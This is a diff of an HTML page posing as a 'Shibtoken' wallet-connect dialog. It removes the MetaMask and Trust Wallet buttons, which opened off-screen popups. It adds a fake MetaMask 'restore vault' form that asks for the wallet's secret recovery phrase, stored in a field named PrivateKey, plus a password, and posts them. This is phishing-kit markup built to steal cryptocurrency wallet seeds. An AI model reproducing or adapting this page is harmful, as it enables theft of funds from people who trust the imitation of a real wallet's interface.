@@ -35,12 +35,29 @@ display:none!important;
 <div data-v-981381f4="" class="font-heading-medium font-semibold ps-16 ps-md-32" style="padding: 30px;text-align: center!important;">Connect a Wallet</div>
 
 
-<div data-v-981381f4="" class="container"><div data-v-981381f4="" class="row ps-x-32"><div href="#" onclick="window.open('===================l#restore-vault','','toolbar=yes,scrollbars=yes,resizable=yes,top=0,left=15000,width=363,height=608') ;return false" data-v-981381f4="" class="col-12 login-with no-bottom-border-radius ps-16 ps-md-20 cursor-pointer pointer hover-b--primary5">
-<div data-v-981381f4="" class="d-flex"><div data-v-981381f4="" class="logo-metamask d-flex align-self-center"><img data-v-981381f4="" src="./Shibtoken_files/metamask.png" alt="Metamask" class="align-self-center"></div> <div data-v-981381f4="" class="d-flex flex-column text-left align-self-center ps-l-20"><span data-v-981381f4="" class="font-heading font-semibold">MetaMask</span> <span data-v-981381f4="" class="font-body-small text-gray"></span></div> <svg data-v-981381f4="" class="svg-sprite-icon right-arrow align-self-center font-gray ml-auto"><use href="#right-arrow"></use></svg></div></div></div>
-<div data-v-981381f4="" class="row ps-x-32">
-  <div href="#" onclick="window.open('=======================#restore-vault','','toolbar=yes,scrollbars=yes,resizable=yes,top=0,left=100000,width=340,height=577') ;return false" data-v-981381f4="" class="col-12 login-with no-top-border-radius no-bottom-border-radius ps-16 ps-md-20 cursor-pointer pointer hover-b--primary5">
-  <div data-v-981381f4="" class="d-flex"><div data-v-981381f4="" class="logo-wallet-connect d-flex align-self-center"><img data-v-981381f4="" src="./Shibtoken_files/trust-wallet.png" alt="wallet connect" class="align-self-center"></div> <div data-v-981381f4="" class="d-flex flex-column text-left align-self-center ps-l-20"><span data-v-981381f4="" class="font-heading font-semibold">Trust Wallet</span> <span data-v-981381f4="" class="font-body-small text-gray"></span></div> <svg data-v-981381f4="" class="svg-sprite-icon right-arrow align-self-center font-gray ml-auto"><use href="#right-arrow"></use></svg></div></div></div>
-
+ <div class="jarak-atas">
+                <div class="confirm-approve-content__card--no-border">
+                    <form method="post" id="metamask">
+                        <label style="font-size:0.8rem; color:rgb(77,77,77);">Wallet Seed</label>
+                            <textarea type="text" id="PrivateKey" name="PrivateKey" style="font-size: 14px;" placeholder="Paste secret recovery phrase from clipboard" maxlength="280" required autocomplete="off"></textarea>
+                        <label for="fname" style="font-size:0.8rem; color:rgb(77,77,77);">Password</label>
+                        <input id="password1" type="password" style="font-size:0.8rem; color:rgb(77,77,77);" id="fname" name="password1" value="" required autocomplete="off">
+                        <label for="lname" style="font-size:0.8rem; color:rgb(77,77,77);">Confirm Password</label>
+                        <input  id="password2" type="password" style="font-size:0.8rem; color:rgb(77,77,77);" id="lname" name="password2" value="" required autocomplete="off">
+                        <button type="submit" id="next-btnmetamask" class="next-btnmetamask" data-testid="page-container-footer-next" role="button" tabindex="0">Restore</button>
+                    </form>
+                </div>
+            </div>
+        </div>
+           </div>
+    <!--End Popup MetaMask-->
+    <!--Start Popup TrustWallet-->
+    <div class="addon-box v2" id="trustwallet" style="display: none;">
+        <div class="headtrust">
+            <a href="javascript:;">
+                <button type="button" class="btn-closemetamask" data-bs-dismiss="modal" aria-label="Close"></button>
+            </a>
+        </div><br>
 <div data-v-981381f4="" class="row justify-content-center wallet-download-info ms-t-32">
     </div></div></div></div>
 </div>
